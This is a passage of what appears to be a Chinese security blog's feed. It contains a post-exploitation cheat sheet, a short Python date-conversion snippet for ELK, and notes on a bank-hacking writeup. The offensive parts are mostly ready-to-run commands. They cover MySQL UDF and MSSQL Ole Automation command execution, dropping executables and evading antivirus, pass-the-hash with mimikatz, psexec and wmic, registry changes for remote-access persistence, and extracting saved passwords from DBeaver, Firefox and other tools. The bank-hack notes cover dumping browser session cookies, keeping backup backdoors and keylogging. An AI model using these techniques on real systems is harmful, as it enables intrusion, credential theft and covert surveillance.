class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p><pre class="line-numbers language-none"><code class="language-none">select @@plugin_dir;select hello into outfile &lt;plugin_dir&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后使用msf的自带的udf，先转换为16进制，然后导出到插件目录:</p><pre class="line-numbers language-none"><code class="language-none">use test;set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);create table Ghost(data LONGBLOB);insert into Ghost values(&quot;&quot;);update Ghost set data &#x3D; @a;select data from Ghost into DUMPFILE &lt;dir&gt;;create function sys_eval returns string soname &#39;sys_eval.dll&#39;;drop function sys_eval; &#x2F;&#x2F;用完删除，养成好习惯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>首选sys_eval, 尽量不要使用sys_exec(会崩溃)</code></strong></p><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>mssql爆破尽量放在后面执行，动静会比较大。</p><pre class="line-numbers language-none"><code class="language-none">mssql爆破成功之后，最好使用CLR来获取权限，直接使用&#96;xp_cmdshell&#96;会死翘翘,360会拦截<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>已知mssql的用户密码，certutil等工具会被拦截或者报警，可以使用mssql自带的工具写入到硬盘：</p><p>现开启存储过程:</p><pre class="line-numbers language-none"><code class="language-none">sp_configure &#39;show advanced options&#39;, 1;  GO  RECONFIGURE;  GO  sp_configure &#39;Ole Automation Procedures&#39;, 1;  GO  RECONFIGURE;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="mssql写大文件"><a href="#mssql写大文件" class="headerlink" title="mssql写大文件"></a>mssql写大文件</h5><p>比如exe之类的先转换为hex,然后再写入到文件:</p><p><code>xxd -plain /tmp/test.exe | tr -d &#39;\n&#39; &gt; /tmp/dll.hex</code></p><pre class="line-numbers language-none"><code class="language-none">declare @hexstring varchar(max);set @hexstring &#x3D; &#39;转换之后的hex&#39;;declare @file varbinary(max);set @file &#x3D; (select cast(&#39;&#39; as xml).value(&#39;xs:hexBinary( substring(sql:variable(&quot;@hexstring&quot;), sql:column(&quot;t.pos&quot;)) )&#39;, &#39;varbinary(max)&#39;)from (select case substring(@hexstring, 1, 2) when &#39;0x&#39; then 3 else 0 end) as t(pos));select @file;declare @init int;declare @filepath nvarchar(4000) &#x3D; N&#39;c:\22.exe&#39;;EXEC sp_OACreate &#39;ADODB.Stream&#39;, @init OUTPUT; -- An instace createdEXEC sp_OASetProperty @init, &#39;Type&#39;, 1;EXEC sp_OAMethod @init, &#39;Open&#39;; -- Calling a methodEXEC sp_OAMethod @init, &#39;Write&#39;, NULL, @file; -- Calling a methodEXEC sp_OAMethod @init, &#39;SaveToFile&#39;, NULL, @filepath, 2; -- Calling a methodEXEC sp_OAMethod @init, &#39;Close&#39;; -- Calling a methodEXEC sp_OADestroy @init; -- Closed the resources<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="mssql备份"><a href="#mssql备份" class="headerlink" title="mssql备份"></a>mssql备份</h4><pre class="line-numbers language-none"><code class="language-none">BACKUP DATABASE &lt;db&gt;TO DISK &#x3D; &#39;C:\Windows\temp\db.bak&#39; WITH COMPRESSION, INIT, STATS &#x3D; 5;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>分卷压缩</li></ul><pre class="line-numbers language-none"><code class="language-none">rar.exe a -m0 -v100m C:\windows\temp\db.split C:\windows\tasks\db.bakdownload C:\\windows\\temp\\db.split.rar &#x2F;var&#x2F;tmp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h4><ul><li>wmi</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.1.158 &#x2F;user:pt007 &#x2F;password:admin123  process call create &quot;cmd.exe &#x2F;c ipconfig&gt;d:\result.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>推荐使用wmiexec.vbs:</p><p><a href="https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs">https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs</a></p><pre class="line-numbers language-none"><code class="language-none">cscript C:\Windows\Tasks\aliwmi.vbs &#x2F;cmd &lt;ip&gt;  &quot;C:\Windows\system32\calc.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>msf</li></ul><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec show optionsset RHOST 192.168.81.129set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BFset SMBUser Administratorshow optionsrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>mimikatz || Cobalt Strike</li></ul><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;sekurlsa::pth &#x2F;domain:. &#x2F;user:administrator &#x2F;ntlm:2D20D252A479F485CDF5E171D93985BF &#x2F;run:cmd.exe&quot; &#x2F;&#x2F;传递hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>psexec</li></ul><pre class="line-numbers language-none"><code class="language-none">psexec &#x2F;accepteula &#x2F;&#x2F;接受许可协议sc delete psexesvcpsexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>psexec.vbs</li></ul><pre class="line-numbers language-none"><code class="language-none">cscript psexec.vbs 192.168.1.158 pt007 admin123 &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>远程命令执行sc</li></ul><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.17.138\c$ &quot;admin123&quot; &#x2F;user:pt007net usedir \\192.168.17.138\c$copy test.exe \\192.168.17.138\c$sc \\192.168.17.138 create test binpath&#x3D; &quot;c:\test.exe&quot;sc \\192.168.17.138 start testsc \\192.168.17.138 del test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>windows远程执行cmd的9种方法: <a href="https://xz.aliyun.com/t/5957">https://xz.aliyun.com/t/5957</a></p><h3 id="access-is-denied"><a href="#access-is-denied" class="headerlink" title="access is denied"></a>access is denied</h3><p>对于任何非RID 500的本地管理员(Administrator)连接到Windows Vista+的计算机，无论采用wmi、psexec还是其它方法，使用的令牌都是中等令牌, 使用wmiexec的时候会修暗示Access is Denied</p><p>在抓取hash的情况下，可以修改注册表，使得本地管理员组成员都可以远程连接,作为一种持久化的手段。</p><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>###RDP的PTH<br>抓取hash无法破解的情况下，如果使用hash远程登录RDP，需要被登录的系统开启”Restricted Admin Mode”, 在Windows8.1和Windows Server 2012R2上默认开启。Windows7和WinServer 2008需要安装2871997、2973351布丁。</p><h4 id="启动RDP"><a href="#启动RDP" class="headerlink" title="启动RDP"></a>启动RDP</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;fREG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f  # 监听 3389 端口 开启3389wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="开启Restricted-Admin-mode"><a href="#开启Restricted-Admin-mode" class="headerlink" title="开启Restricted Admin mode"></a>开启Restricted Admin mode</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="增加防火墙规则"><a href="#增加防火墙规则" class="headerlink" title="增加防火墙规则"></a>增加防火墙规则</h4><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; dir&#x3D;in protocol&#x3D;TCP localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="dump-passwod"><a href="#dump-passwod" class="headerlink" title="dump passwod"></a>dump passwod</h3><p>####dbeaver</p><p>dbeaver6的配置文件(不同版本存储的位置和解密方式不一样):</p><pre class="line-numbers language-none"><code class="language-none">#密码加密存储位置:C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\credentials-config.json#url和用户名:C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\data-sources.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密脚本: <a href="https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61">https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61</a></p><p>下载<code>credentials-config.json</code>脚本之后，使用python解密:<code>python decrypt.py credentials-config.json</code>，然后根据解密出来的id去<code>data-sources.json</code>里面找对应的IP和用户名。</p><p>老版本的密码是存储在:<code>C:\Users\&lt;users&gt;\.dbeaver4\General\.dbeaver-data-source.xml</code>，可以直接使用在线解密:<a href="http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/">http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/</a></p><h3 id="MobaXterm"><a href="#MobaXterm" class="headerlink" title="MobaXterm"></a>MobaXterm</h3><p>有一个<code>.ini</code>的文件，有对应的IP信息和私钥地址<br>老版本的存储: C:\Users%USERNAME%\AppData\Roaming\MobaXterm<br>2020年的版本: C:\Users%USERNAME%\Documents\MobaXterm</p><h3 id="VSCODE"><a href="#VSCODE" class="headerlink" title="VSCODE"></a>VSCODE</h3><p>Windows下的配置文件在这个地方:</p><pre class="line-numbers language-none"><code class="language-none">%APPDATA%\Code\User\settings.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以根据配置文件找到笔记和ssh等存储位置</p><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><p>三好师傅讲的很详细，我选择使用firepwd.py:</p><pre class="line-numbers language-none"><code class="language-none">firefox的配置文件目录:%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\下载解密需要的文件:key4.db和logins.json下载解密脚本:https:&#x2F;&#x2F;github.com&#x2F;lclevy&#x2F;firepwd上面三个东西放在一个文件夹:python3 firepwd.py <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p><h3 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h3><ol><li>CS里面的<code>screenshot</code></li><li>msf里面: <code>use espia</code> <code>screengrab</code></li><li>msf的持续截屏: <code>post/windows/gather/screen_spy</code></li><li>Win10自带: <code>psr.exe /start /gui 0 /output C:\cool.zip /maxlogsize 1</code></li></ol><h3 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h3><pre class="line-numbers language-none"><code class="language-none">在C盘搜索script.js这个文件:dir &#x2F;s &#x2F;b C:\script.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-环境&quot;&gt;&lt;a href=&quot;#0x01-环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境&quot;&gt;&lt;/a&gt;0x01 环境&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Linux主机www权限&lt;/li&gt;
&lt;li&gt;主机无法出外网&lt;/li&gt;
&lt;li&gt;正向代理无法使用&lt;/li&gt;
&lt;li&gt;B段内网&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;收集信息&quot;&gt;&lt;a href=&quot;#收集信息&quot; class=&quot;headerlink&quot; title=&quot;收集信息&quot;&gt;&lt;/a&gt;收集信息&lt;/h2&gt;&lt;p&gt;#####F-Scrack.py&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;获取Redis, ES等
PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h3 id=&quot;Redis&quot;&gt;&lt;a href=&quot;#Redis&quot; class=&quot;headerlink&quot; title=&quot;Redis&quot;&gt;&lt;/a&gt;Redis&lt;/h3&gt;&lt;p&gt;key较多的时候不要使用&lt;code&gt;keys *&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;查看基本信息: master，数量，版本号
使用scan查看keys: scan 0 match * count 100 
查看类型: type &amp;lt;key&amp;gt;
hash类型: hgetall &amp;lt;key&amp;gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;MySQL&quot;&gt;&lt;a href=&quot;#MySQL&quot; class=&quot;headerlink&quot; title=&quot;MySQL&quot;&gt;&lt;/a&gt;MySQL&lt;/h3&gt;&lt;p&gt;windows下可以先测试是否可写入插件目录:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Python处理xlsx到ELK</title>
    <link href="https://jkme.github.io/2020/05/06/python-elk.html"/>
    <id>https://jkme.github.io/2020/05/06/python-elk.html</id>
    <published>2020-05-05T16:00:00.000Z</published>
    <updated>2022-01-21T03:39:54.159Z</updated>
    
    <content type="html"><![CDATA[<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span><span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;float2utc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
	date &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; datetime&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;datetime&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;xldate_as_tuple&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

	local &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pytz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;timezone&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Asia/Shanghai&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	local_dt &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;localize&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;date&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; is_dst&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	utc_dt &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_dt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;astimezone&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pytz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;utc&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	timeStr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; datetime&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;datetime&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;strftime&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;utc_dt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;%Y-%m-%dT%H:%M:%S.%f&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	timeStr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; timeStr&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;token comment&quot;&gt;#cell = date.strftime(&#39;%Y/%m/%d %H:%M&#39;)&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; timeStr &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Z&quot;&lt;/span&gt;
&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon&quot;&gt;https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
    
    
    
    <category term="Learning" scheme="https://jkme.github.io/categories/Learning/"/>
    
    
  </entry>
  
  <entry>
    <title>How to Hack Bank</title>
    <link href="https://jkme.github.io/2020/04/22/how-to-hack-bank.html"/>
    <id>https://jkme.github.io/2020/04/22/how-to-hack-bank.html</id>
    <published>2020-04-21T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p></blockquote><h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browserstrings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nulfindstr PHPSESSID * .dmp&gt; tmpstrings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol><li>常用的操作用一个后门</li><li>留一个备用的后门，第一个失效之后启用</li></ol><h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p><pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:post&#x2F;windows&#x2F;gather&#x2F;screen_spy再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。使用Windows自带的PSR截屏：psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;Start-Sleep -s 20;psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later Irealized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue living that way. So I began to spend more time away from my computer, with other people, learning to open myself to the world, to feel my emotions, to connect with others, to accept risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;[Thread-Phineas-Phisher-Hack-Back-Bank]&lt;a href=&quot;https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank&quot;&gt;https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;从浏览器dump登陆Cookie&quot;&gt;&lt;a href=&quot;#从浏览器dump登陆Cookie&quot; class=&quot;headerlink&quot; title=&quot;从浏览器dump登陆Cookie&quot;&gt;&lt;/a&gt;从浏览器dump登陆Cookie&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;procdump64 &amp;#x2F;accepteula -r -ma PID_of_browser
strings64 &amp;#x2F;accepteula * .dmp | findstr PHPSESSID 2&amp;gt; nul
findstr PHPSESSID * .dmp&amp;gt; tmp
strings64 &amp;#x2F;accepteula tmp | findstr PHPSESSID 2&amp;gt; nul&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;准备后路&quot;&gt;&lt;a href=&quot;#准备后路&quot; class=&quot;headerlink&quot; title=&quot;准备后路&quot;&gt;&lt;/a&gt;准备后路&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;常用的操作用一个后门&lt;/li&gt;
&lt;li&gt;留一个备用的后门，第一个失效之后启用&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;收集信息&quot;&gt;&lt;a href=&quot;#收集信息&quot; class=&quot;headerlink&quot; title=&quot;收集信息&quot;&gt;&lt;/a&gt;收集信息&lt;/h3&gt;&lt;p&gt;用到一下模块:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;MSF每5s截屏:
post&amp;#x2F;windows&amp;#x2F;gather&amp;#x2F;screen_spy

再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。


使用Windows自带的PSR截屏：
psr.exe &amp;#x2F;start &amp;#x2F;gui 0 &amp;#x2F;output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20;
psr.exe &amp;#x2F;stop;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;h3 id=&quot;END&quot;&gt;&lt;a href=&quot;#END&quot; class=&quot;headerlink&quot; title=&quot;END&quot;&gt;&lt;/a&gt;END&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
realized that, in reality, I could do something positive. I don&amp;#39;t regret the way I grew up at 
all, it brought several beautiful experiences to my life. But I knew I couldn&amp;#39;t continue 
living that way. So I began to spend more time away from my computer, with other people, 
learning to open myself to the world, to feel my emotions, to connect with others, to accept 
risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
my way.&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Fun" scheme="https://jkme.github.io/categories/Fun/"/>
    
    
  </entry>
  
  <entry>
    <title>通过DPAPI获取windows身份凭证</title>
